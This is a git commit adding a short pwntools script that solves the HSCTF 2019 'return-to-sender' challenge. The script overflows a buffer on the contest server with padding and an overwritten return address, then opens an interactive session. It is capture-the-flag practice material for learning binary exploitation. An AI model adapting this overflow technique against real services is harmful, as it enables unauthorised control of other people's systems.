7986ffce6244c116e22db8fce375872d691a9d5f
Siryu6 <guillaume.grabe@protonmail.com>
2019-06-28 14:01:10 +0200

    Add files via upload

---
+++ 2019/HSCTF/binary sploit/return-to-sender/sploit.py
@@ -0,0 +1,9 @@
+#!/usr/bin/env python2.7
+from pwn import *
+context(arch = 'i386', os = 'linux')
+
+r = remote('pwn.hsctf.com', 1234)
+payload='A'*10 + 'B'*8 + 'C'*2 + '\xb6\x91\x04\x08'
+r.send(payload)
+r.interactive()
+
